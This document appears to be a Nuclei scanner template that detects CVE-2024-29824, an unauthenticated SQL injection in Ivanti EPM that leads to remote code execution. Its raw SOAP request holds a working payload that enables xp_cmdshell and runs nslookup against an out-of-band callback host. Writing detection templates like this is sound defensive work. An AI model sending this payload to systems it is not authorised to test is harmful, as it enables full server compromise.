http:
- matchers:
  - part: content_type
    type: word
    words:
    - application/soap+xml
  - part: body
    type: word
    words:
    - UpdateStatusEventsResponse
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /WSStatusEvents/EventHandler.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/soap+xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap12:Envelope\
    \ xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
    \ xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap12:Body>\n\
    \    <UpdateStatusEvents xmlns=\"http://tempuri.org/\">\n      <deviceID>string</deviceID>\n\
    \      <actions>\n        <Action name=\"string\" code=\"0\" date=\"0\" type=\"\
    96\" user=\"string\" configguid=\"string\" location=\"string\">\n          <status>GoodApp=1|md5=';\
    \ EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure\
    \ 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup {{interactsh-url}}'--</status>\n\
    \        </Action>\n      </actions>\n    </UpdateStatusEvents>\n  </soap12:Body>\n\
    </soap12:Envelope>\n"
id: CVE-2024-29824
info:
  author: DhiyaneshDK
  classification:
    cve-id: CVE-2024-29824
    cvss-metrics: CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    epss-percentile: 0.99892
    epss-score: 0.9405
  description: 'An unspecified SQL Injection vulnerability in Core server of Ivanti
    EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network
    to execute arbitrary code.

    '
  impact: 'Attackers can execute arbitrary code on the Ivanti EPM server, leading
    to complete system compromise.

    '
  metadata:
    max-request: 1
  name: Ivanti EPM - Remote Code Execution
  reference:
  - https://github.com/horizon3ai/CVE-2024-29824
  - https://nvd.nist.gov/vuln/detail/CVE-2024-29824
  - https://forums.ivanti.com/s/article/Security-Advisory-May-2024
  - https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/
  remediation: 'Apply security updates for Ivanti EPM that address CVE-2024-29824.

    '
  severity: critical
  tags: cve,cve2024,ivanti,epm,sqli,rce,kev,vkev,vuln
